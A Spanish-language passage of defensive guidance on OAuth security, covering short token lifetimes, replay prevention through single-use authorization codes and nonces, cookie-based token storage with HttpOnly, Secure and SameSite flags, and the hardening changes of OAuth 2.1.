La caducidad insuficiente de tokens de acceso representa un riesgo de persistencia desproporcionado. Cuando los servidores emiten tokens con vidas útiles de días, meses o sin fecha de vencimiento explícita, cualquier fuga accidental o compromiso temporal permite a los atacantes mantener un acceso ininterrumpido a las APIs protegidas. Las directrices de endurecimiento dictan que los tokens de acceso deben configurarse con vigencias extremadamente cortas (del orden de 10 a 60 minutos), apoyándose en tokens de actualización resguardados en almacenamiento seguro para renovar las credenciales sin fricción para el usuario.

Los ataques de repetición (*Replay Attacks*) se manifiestan cuando el servidor de autorización permite que un código de autorización o un token capturado se utilice en múltiples ocasiones. La especificación técnica exige que los códigos de autorización se autodestruyan inmediatamente tras su primer canje; si el servidor detecta un intento de reutilización de un mismo código, debe revocar de inmediato todos los tokens de acceso previamente generados asociados a esa transacción como medida de contingencia. Del mismo modo, la introducción de parámetros `nonce` y marcas de tiempo previene el reenvío de respuestas de autenticación capturadas en tránsito.

El almacenamiento inseguro de tokens en el navegador constituye otra práctica defectuosa generalizada. Guardar tokens de acceso o de actualización en el almacenamiento local (*LocalStorage*) o de sesión (*SessionStorage*) expone irreversiblemente las credenciales a cualquier vulnerabilidad de XSS presente en la aplicación. La alternativa recomendada es almacenar los tokens en cookies HTTP protegidas con las banderas `HttpOnly` para evitar su lectura mediante JavaScript, `Secure` para garantizar su transmisión exclusiva sobre HTTPS cifrado y `SameSite=Strict` o `Lax` para mitigar ataques de CSRF.

La evolución del protocolo ha cristalizado en la consolidación del estándar OAuth 2.1, una iniciativa de estandarización que consolida y hace obligatorias las mejores prácticas acumuladas durante más de una década de despliegue operativo. Entre sus modificaciones fundamentales destacan la depreciación definitiva y eliminación del Flujo Implícito y del Flujo de Credenciales de Contraseña del Propietario del Recurso; la obligatoriedad universal del uso de PKCE en el Flujo de Código de Autorización para todos los clientes (tanto públicos como confidenciales); la exigencia estricta del parámetro `state` o de claves criptográficas equivalentes en cada solicitud; la imposición de comparación exacta de caracteres para las URIs de redirección pre-registradas; y la prohibición explícita del almacenamiento de credenciales en mecanismos accesibles por script en el cliente.
